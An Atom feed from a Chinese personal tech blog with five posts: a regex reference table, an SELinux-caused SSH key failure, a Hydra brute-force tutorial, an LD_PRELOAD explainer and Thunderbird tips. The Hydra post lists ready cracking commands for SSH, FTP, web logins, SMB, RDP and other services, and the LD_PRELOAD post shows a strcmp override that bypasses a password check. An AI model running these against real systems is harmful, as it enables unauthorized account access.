<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: system~tools | kk Blog —— 通用基础]]></title>
  <link href="http://abcdxyzk.github.io/blog/cats/system~tools/atom.xml" rel="self"/>
  <link href="http://abcdxyzk.github.io/"/>
  <updated>2014-12-07T17:07:47+08:00</updated>
  <id>http://abcdxyzk.github.io/</id>
  <author>
    <name><![CDATA[kk]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[正则表达式常用字符]]></title>
    <link href="http://abcdxyzk.github.io/blog/2014/11/27/tools-reg-exp-base/"/>
    <updated>2014-11-27T19:05:00+08:00</updated>
    <id>http://abcdxyzk.github.io/blog/2014/11/27/tools-reg-exp-base</id>
    <content type="html"><![CDATA[<table>
    <tr>
        <td style="text-align: center;">字符</td>
        <td style="text-align: center;">描述</td>
    </tr>
    <tr>
        <td style="text-align: center;">\</td>
        <td>将下一个字符标记为一个特殊字符、或一个原义字符、或一个 后向引用、或一个八进制转义符。例如，'n' 匹配字符 "n"。'\n' 匹配一个换行符。序列 '\\' 匹配 "\" 而 "\(" 则匹配 "("。</td>
    </tr>
    <tr>
        <td style="text-align: center;">^</td>
        <td>匹配输入字符串的开始位置。如果设置了&nbsp;<strong>RegExp</strong>&nbsp;对象的&nbsp;<strong>Multiline</strong>&nbsp;属性，^ 也匹配 '\n' 或 '\r' 之后的位置。</td>
    </tr>
    <tr>
        <td style="text-align: center;">$</td>
        <td>匹配输入字符串的结束位置。如果设置了<strong>RegExp</strong>&nbsp;对象的&nbsp;<strong>Multiline</strong>&nbsp;属性，$ 也匹配 '\n' 或 '\r' 之前的位置。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\A</td>
        <td>指定匹配必须出现在字符串的开头（忽略 &nbsp; <strong>Multiline</strong> &nbsp; 选项）。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\Z</td>
        <td>指定匹配必须出现在字符串的结尾或字符串结尾的 &nbsp; &nbsp; 之前（忽略 &nbsp; <strong>Multiline</strong> &nbsp; 选项）。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\z</td>
        <td>指定匹配必须出现在字符串的结尾（忽略 &nbsp; <strong>Multiline</strong> &nbsp; 选项）。</td>
    </tr>
    <tr>
        <td style="text-align: center;">*</td>
        <td>匹配前面的子表达式零次或多次。例如，zo* 能匹配 "z" 以及 "zoo"。 * 等价于{0,}。</td>
    </tr>
    <tr>
        <td style="text-align: center;">+</td>
        <td>匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 "zo" 以及 "zoo"，但不能匹配 "z"。+ 等价于 {1,}。</td>
    </tr>
    <tr>
        <td style="text-align: center;">?</td>
        <td>匹配前面的子表达式零次或一次。例如，"do(es)?" 可以匹配 "do" 或 "does" 中的"do" 。? 等价于 {0,1}。</td>
    </tr>
    <tr>
        <td style="text-align: center;">{<em>n</em>}</td>
        <td><em>n</em>&nbsp;是一个非负整数。匹配确定的&nbsp;<em>n</em>&nbsp;次。例如，'o{2}' 不能匹配 "Bob" 中的 'o'，但是能匹配 "food" 中的两个 o。</td>
    </tr>
    <tr>
        <td style="text-align: center;">{<em>n</em>,}</td>
        <td><em>n</em>&nbsp;是一个非负整数。至少匹配<em>n</em>&nbsp;次。例如，'o{2,}' 不能匹配 "Bob" 中的 'o'，但能匹配 "foooood" 中的所有 o。'o{1,}' 等价于 'o+'。'o{0,}' 则等价于 'o*'。</td>
    </tr>
    <tr>
        <td style="text-align: center;">{<em>n</em>,<em>m</em>}</td>
        <td><em>m</em>&nbsp;和&nbsp;<em>n</em>&nbsp;均为非负整数，其中<em>n</em>&nbsp;&lt;=&nbsp;<em>m</em>。最少匹配&nbsp;<em>n</em>&nbsp;次且最多匹配&nbsp;<em>m</em>&nbsp;次。刘， "o{1,3}" 将匹配 "fooooood" 中的前三个 o。'o{0,1}' 等价于 'o?'。请注意在逗号和两个数之间不能有空格。</td>
    </tr>
    <tr>
        <td style="text-align: center;">?</td>
        <td>当该字符紧跟在任何一个其他限制符 (*, +, ?, {<em>n</em>}, {<em>n</em>,}, {<em>n</em>,<em>m</em>}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 "oooo"，'o+?' 将匹配单个 "o"，而 'o+' 将匹配所有 'o'。</td>
    </tr>
    <tr>
        <td style="text-align: center;">.</td>
        <td>匹配除 "\n" 之外的任何单个字符。要匹配包括 '\n' 在内的任何字符，请使用象 '[.\n]' 的模式。</td>
    </tr>
    <tr>
        <td style="text-align: center;">(<em>pattern</em>)</td>
        <td>匹配<em>pattern</em>&nbsp;并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用&nbsp;<strong>SubMatches</strong>&nbsp;集合，在Visual Basic Scripting Edition 中则使用&nbsp;<strong>$0</strong>…<strong>$9</strong>&nbsp;属性。要匹配圆括号字符，请使用 '\(' 或 '\)'。</td>
    </tr>
    <tr>
        <td style="text-align: center;">(?:<em>pattern</em>)</td>
        <td>匹配&nbsp;<em>pattern</em>&nbsp;但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 "或" 字符 (|) 来组合一个模式的各个部分是很有用。例如， 'industr(?:y|ies) 就是一个比 'industry|industries' 更简略的表达式。</td>
    </tr>
    <tr>
        <td style="text-align: center;">(?=<em>pattern</em>)</td>
        <td>正向预查，在任何匹配&nbsp;<em>pattern</em>&nbsp;的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如， 'Windows (?=95|98|NT|2000)' 能匹配 "Windows 2000" 中的 "Windows" ，但不能匹配 "Windows 3.1" 中的 "Windows"。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td>
    </tr>
    <tr>
        <td style="text-align: center;">(?!<em>pattern</em>)</td>
        <td>负向预查，在任何不匹配Negative lookahead matches the search string at any point where a string not matching&nbsp;<em>pattern</em>&nbsp;的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如'Windows (?!95|98|NT|2000)' 能匹配 "Windows 3.1" 中的 "Windows"，但不能匹配 "Windows 2000" 中的 "Windows"。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始</td>
    </tr>
    <tr>
        <td style="text-align: center;"><em>x</em>|<em>y</em></td>
        <td>匹配&nbsp;<em>x</em>&nbsp;或&nbsp;<em>y</em>。例如，'z|food' 能匹配 "z" 或 "food"。'(z|f)ood' 则匹配 "zood" 或 "food"。</td>
    </tr>
    <tr>
        <td style="text-align: center;">[<em>xyz</em>]</td>
        <td>字符集合。匹配所包含的任意一个字符。例如， '[abc]' 可以匹配 "plain" 中的 'a'。</td>
    </tr>
    <tr>
        <td style="text-align: center;">[^<em>xyz</em>]</td>
        <td>负值字符集合。匹配未包含的任意字符。例如， '[^abc]' 可以匹配 "plain" 中的'p'。</td>
    </tr>
    <tr>
        <td style="text-align: center;">[<em>a-z</em>]</td>
        <td>字符范围。匹配指定范围内的任意字符。例如，'[a-z]' 可以匹配 'a' 到 'z' 范围内的任意小写字母字符。</td>
    </tr>
    <tr>
        <td style="text-align: center;">[^<em>a-z</em>]</td>
        <td>负值字符范围。匹配任何不在指定范围内的任意字符。例如，'[^a-z]' 可以匹配任何不在 'a' 到 'z' 范围内的任意字符。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\b</td>
        <td>匹配一个单词边界，也就是指单词和空格间的位置。例如， 'er\b' 可以匹配"never" 中的 'er'，但不能匹配 "verb" 中的 'er'。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\B</td>
        <td>匹配非单词边界。'er\B' 能匹配 "verb" 中的 'er'，但不能匹配 "never" 中的 'er'。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\c<em>x</em></td>
        <td>匹配由<em>x</em>指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。&nbsp;<em>x</em>&nbsp;的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 'c' 字符。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\d</td>
        <td>匹配一个数字字符。等价于 [0-9]。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\D</td>
        <td>匹配一个非数字字符。等价于 [^0-9]。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\f</td>
        <td>匹配一个换页符。等价于 \x0c 和 \cL。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\n</td>
        <td>匹配一个换行符。等价于 \x0a 和 \cJ。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\r</td>
        <td>匹配一个回车符。等价于 \x0d 和 \cM。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\s</td>
        <td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [&nbsp;\f\n\r\t\v]。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\S</td>
        <td>匹配任何非空白字符。等价于 [^&nbsp;\f\n\r\t\v]。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\t</td>
        <td>匹配一个制表符。等价于 \x09 和 \cI。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\v</td>
        <td>匹配一个垂直制表符。等价于 \x0b 和 \cK。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\w</td>
        <td>匹配包括下划线的任何单词字符。等价于'[A-Za-z0-9_]'。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\W</td>
        <td>匹配任何非单词字符。等价于 '[^A-Za-z0-9_]'。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\x<em>n</em></td>
        <td>匹配&nbsp;<em>n</em>，其中&nbsp;<em>n</em>&nbsp;为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如， '\x41' 匹配 "A"。'\x041' 则等价于 '\x04' &amp; "1"。正则表达式中可以使用 ASCII 编码。.</td>
    </tr>
    <tr>
        <td style="text-align: center;">\<em>num</em></td>
        <td>匹配&nbsp;<em>num</em>，其中&nbsp;<em>num</em>&nbsp;是一个正整数。对所获取的匹配的引用。例如，'(.)\1' 匹配两个连续的相同字符。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\<em>n</em></td>
        <td>标识一个八进制转义值或一个后向引用。如果 \<em>n</em>&nbsp;之前至少&nbsp;<em>n</em>&nbsp;个获取的子表达式，则&nbsp;<em>n</em>&nbsp;为后向引用。否则，如果&nbsp;<em>n</em>&nbsp;为八进制数字 (0-7)，则&nbsp;<em>n</em>&nbsp;为一个八进制转义值。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\<em>nm</em></td>
        <td>标识一个八进制转义值或一个后向引用。如果 \<em>nm</em>&nbsp;之前至少有is preceded by at least&nbsp;<em>nm</em>&nbsp;个获取得子表达式，则&nbsp;<em>nm</em>&nbsp;为后向引用。如果 \<em>nm</em>&nbsp;之前至少有&nbsp;<em>n</em>&nbsp;个获取，则&nbsp;<em>n</em>&nbsp;为一个后跟文字&nbsp;<em>m&nbsp;</em>的后向引用。如果前面的条件都不满足，若&nbsp;&nbsp;<em>n</em>&nbsp;和&nbsp;<em>m</em>&nbsp;均为八进制数字 (0-7)，则 \<em>nm</em>&nbsp;将匹配八进制转义值&nbsp;<em>nm</em>。</td>
    </tr>
    <tr>
        <td style="text-align: center;">\<em>nml</em></td>
        <td>如果&nbsp;<em>n</em>&nbsp;为八进制数字 (0-3)，且&nbsp;<em>m</em>&nbsp;和&nbsp;<em>l</em>&nbsp;均为八进制数字 (0-7)，则匹配八进制转义值&nbsp;<em>nml。</em></td>
    </tr>
    <tr>
        <td style="text-align: center;">\u<em>n</em></td>
        <td>匹配&nbsp;<em>n</em>，其中&nbsp;<em>n</em>&nbsp;是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。</td>
    </tr>
</table>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SELinux引起的SSH公钥认证失败]]></title>
    <link href="http://abcdxyzk.github.io/blog/2014/10/15/tools-ssh-rsa-error/"/>
    <updated>2014-10-15T10:39:00+08:00</updated>
    <id>http://abcdxyzk.github.io/blog/2014/10/15/tools-ssh-rsa-error</id>
    <content type="html"><![CDATA[<ul>
<li><p>restorecon -r -vv /root/.ssh</p>

<p>新装一台机器按照正常配置以后居然使用publickey方式认证不成功，但是使用密码认证是可以的。</p>

<p>具体现象表现为使用SecureCRT登陆时，出现如下出错提示：
Public-key authentication with the server for user sw failed. Please verify username and public/private key pair.
查看服务器日志，找不到有用的相关记录。
之后直接在另一台机器上使用ssh连接，打开verbose模式（ssh -vvv），如下：
<code>
...
debug1: Next authentication method: password
sw@xxx.xxx.xxx.xxx's password:
</code>
可以看到，ssh先尝试了使用publickey进行认证，但是失败了，日志也没有显示相关原因，然后降级到使用密码认证。</p></li>
</ul>


<p>求助万能的Google，发现serverfault上有一个案例的现象和出错信息与我遇到几乎一样，提问者怀疑是SELinux导致的。
案例 见 <a href="http://www.linuxidc.com/Linux/2013-07/87267p2.htm  ">http://www.linuxidc.com/Linux/2013-07/87267p2.htm  </a>
下面的回复证实了确实是SELinux的问题，并且给出了解决方案：<br/>
Yes, SELinux is likely the cause. The .ssh dir is probably mislabeled. Look at /var/log/audit/audit.log. It should be labeled ssh_home_t. Check with ls -laZ. Run restorecon -r -vv /root/.ssh if need be.</p>

<p>Yep, SELinux was the cause: type=AVC msg=audit(1318597097.413:5447): avc:denied { read } for pid=19849 comm=&ldquo;sshd&rdquo; name=&ldquo;authorized_keys&rdquo; dev=dm-0 ino=262398 scontext=unconfined_u:system_r:sshd_t:s0-s0:c0.c1023 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file</p>

<p>It works after running &ldquo;restorecon -r -vv /root/.ssh&rdquo;. Thanks a lot.</p>

<p>我如获救命稻草，马上用ls -laZ检查了一下我的.ssh目录，果然不是ssh_home_t，心中窃喜，立刻使用restorecon对.ssh目录的context进行了恢复。</p>

<p>重新连接SSH，认证成功，问题解决</p>

<p>把SELinux暂时关了试试，使用setenforce 0把SELinux关闭，重新尝试连接，publickey认证正常了。 <br/>
确认了是SELinux引发的问题<br/>
然后setenforce 1打开SELinux。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[暴力密码破解工具--关键在于字典]]></title>
    <link href="http://abcdxyzk.github.io/blog/2014/08/06/tools-hydra/"/>
    <updated>2014-08-06T14:51:00+08:00</updated>
    <id>http://abcdxyzk.github.io/blog/2014/08/06/tools-hydra</id>
    <content type="html"><![CDATA[<p><a href="http://www.ha97.com/5186.html">http://www.ha97.com/5186.html</a></p>

<ul>
<li>PS：这款暴力密码破解工具相当强大，支持几乎所有协议的在线密码破解，其密码能否被破解关键在于字典是否足够强大。对于社会工程型渗透来说，有时能够得到事半功倍的效果。</li>
</ul>


<h4>一、简介</h4>

<p>hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。官 网：<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>  ，可支持AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP等类型密码。</p>

<h4>二、安装</h4>

<p>如果是Debian和Ubuntu发行版，源里自带hydra，直接用apt-get在线安装：
<code>
sudo apt-get install libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird2.1-dev libncp-dev hydra
</code>
Redhat/Fedora发行版的下载源码包编译安装，先安装相关依赖包：
<code>
yum install openssl-devel pcre-devel ncpfs-devel postgresql-devel libssh-devel subversion-devel
</code>
hydra下载地址：  <a href="http://www.thc.org/releases/hydra-7.3.tar.gz  ">http://www.thc.org/releases/hydra-7.3.tar.gz  </a>
<code>
    # tar zxvf hydra-7.0-src.tar.gz
    # cd hydra-7.0-src
    # ./configure
    # make
    # make install
</code>
hydra支持GUI图形界面。</p>

<h4>三、参数说明</h4>

<pre><code>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]
[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]
-R 继续从上一次进度接着破解。
-S 采用SSL链接。
-s PORT 可通过这个参数指定非默认端口。
-l LOGIN 指定破解的用户，对特定用户破解。
-L FILE 指定用户名字典。
-p PASS 小写，指定密码破解，少用，一般是采用密码字典。
-P FILE 大写，指定密码字典。
-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。
-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。
-M FILE 指定目标列表文件一行一条。
-o FILE 指定结果输出文件。
-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。
-t TASKS 同时运行的线程数，默认为16。
-w TIME 设置最大超时的时间，单位秒，默认是30s。
-v / -V 显示详细过程。
</code></pre>

<p>server 目标ip
service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。
OPT 可选项</p>

<h4>四、各种用法实例</h4>

<p>简单演示：</p>

<p>破解成功，直接显示结果，上图画红线的地方就是破解出来的密码，也可以通过参数-o输出到文件里。如果字典够强大，结合社工，密码不用很久就出来。</p>

<pre><code>    1、破解ssh：
    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
    hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh

    2、破解ftp：
    hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
    hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV

    3、get方式提交，破解web登录：
    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php

    4、post方式提交，破解web登录：
    hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password"


    hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&amp;passwd=^PASS^:&lt;title&gt;wrong username or password&lt;/title&gt;"

    （参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，
    -f 当破解了一个密码就停止， 10.36.16.18目标ip，
    http-post-form表示破解是采用http的post方式提交的表单密码破解,
    &lt;title&gt;中 的内容是表示错误猜解的返回信息提示。）

    5、破解https：
    hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https

    6、破解teamspeak：
    hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak

    7、破解cisco：
    hydra -P pass.txt 10.36.16.18 cisco
    hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable

    8、破解smb：
    hydra -l administrator -P pass.txt 10.36.16.18 smb

    9、破解pop3：
    hydra -l muts -P pass.txt my.pop3.mail pop3

    10、破解rdp：
    hydra ip rdp -l administrator -P pass.txt -V

    11、破解http-proxy：
    hydra -l admin -P pass.txt http-proxy://10.36.16.18

    12、破解imap：
    hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
    hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LD_PRELOAD环境变量]]></title>
    <link href="http://abcdxyzk.github.io/blog/2013/10/22/tools-LD_PRELOAD/"/>
    <updated>2013-10-22T16:08:00+08:00</updated>
    <id>http://abcdxyzk.github.io/blog/2013/10/22/tools-LD_PRELOAD</id>
    <content type="html"><![CDATA[<p>在Linux的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。</p>

<p>我们知道，Linux的用的都是glibc，有一个叫libc.so.6的文件，这是几乎所有Linux下命令的动态链接中，其中有标准C的各种函数。对于GCC而言，默认情况下，所编译的程序中对标准C函数的链接，都是通过动态链接方式来链接libc.so.6这个函数库的。</p>

<p>OK。还是让我用一个例子来看一下用LD_PRELOAD来hack别人的程序。</p>

<h5>示例一</h5>

<p>我们写下面一段例程：
<code>
    /* 文件名：verifypasswd.c */
    /* 这是一段判断用户口令的程序，其中使用到了标准C函数strcmp*/
    #include &lt;stdio.h&gt;
    #include &lt;string.h&gt;
    int main(int argc, char **argv)
    {
        char passwd[] = "password";
        if (argc &lt; 2) {
            printf("usage: %s &lt;password&gt;/n", argv[0]);
            return 1;
        }
        if (!strcmp(passwd, argv[1])) {
            printf("Correct Password!/n");
            return 1;
        }
        printf("Invalid Password!/n");
        return 0;
    }
</code>
在上面这段程序中，我们使用了strcmp函数来判断两个字符串是否相等。下面，我们使用一个动态函数库来重载strcmp函数：
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/&lt;em&gt; 文件名：hack.c &lt;/em&gt;/
</span><span class='line'>#include &lt;stdio.h&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;#include &lt;string.h&gt;
</span><span class='line'>int strcmp(const char *s1, const char *s2)
</span><span class='line'>{
</span><span class='line'>printf("hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n", s1, s2);
</span><span class='line'>/* 永远返回0，表示两个字符串相等 */
</span><span class='line'>return 0;
</span><span class='line'>}
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;编译程序：
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;$ gcc -o verifypasswd verifypasswd.c
</span><span class='line'>$ gcc -shared -o hack.so hack.c
</span><span class='line'>&lt;code&gt;
</span><span class='line'>测试一下程序：（得到正确结果）
</span><span class='line'>&lt;/code&gt;
</span><span class='line'>$ ./verifypasswd asdf
</span><span class='line'>Invalid Password!</span></code></pre></td></tr></table></div></figure></p>

<h5>设置LD_PRELOAD变量：</h5>

<p>（使我们重写过的strcmp函数的hack.so成为优先载入链接库）
<code>
$ export LD_PRELOAD="./hack.so"
</code>
再次运行程序：
<code>
$ ./verifypasswd  asdf
hack function invoked. s1=&lt;password&gt; s2=&lt;asdf&gt;
Correct Password!
</code>
我们可以看到，<br/>
1）我们的hack.so中的strcmp被调用了。<br/>
2）主程序中运行结果被影响了。<br/>
如果这是一个系统登录程序，那么这也就意味着我们用任意口令都可以进入系统了。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Thunderbird]]></title>
    <link href="http://abcdxyzk.github.io/blog/2013/10/15/tools-thunderbird/"/>
    <updated>2013-10-15T10:10:00+08:00</updated>
    <id>http://abcdxyzk.github.io/blog/2013/10/15/tools-thunderbird</id>
    <content type="html"><![CDATA[<h4>Mozilla Thunderbird 最小化附加组建</h4>

<p>在工具->附加组建中<br/>
1、搜索minimize，安装firetray<br/>
2、firetray 首选项->邮件->邮件通知类型   选第二个：显示新邮件图示<br/>
不想最小化到托盘： firetray 首选项->视窗   去掉第二个勾选</p>

<h4>Mozilla Thunderbird 导入导出邮件</h4>

<p>一种Mozilla Thunderbird的扩展ImportExportTools。<br/>
<a href="https://addons.mozilla.org/zh-CN/thunderbird/addon/importexporttools/">https://addons.mozilla.org/zh-CN/thunderbird/addon/importexporttools/</a></p>

<h5>安装流程 （本地安装）</h5>

<pre><code>1 进入Mozilla Thunderbird
2 点击菜单栏的“工具”-&gt;“附加软件”
3 从附加组件搜索框旁边的选项按钮中，选择“从文件安装附加组件...”选项
4 选择本地文件（ImportExportTools-X.X.xpi）位置 安装
5 安装完成 重启Mozilla Thunderbird
</code></pre>

<h5>如何用呢</h5>

<pre><code>1 进入Mozilla Thunderbird
2 右键“收件箱”
3 “导入/导出”
4 “汇出此资料夹所以的邮件” 进行选择格式
5 汇出完成 查看本地文件夹
</code></pre>
]]></content>
  </entry>
  
</feed>
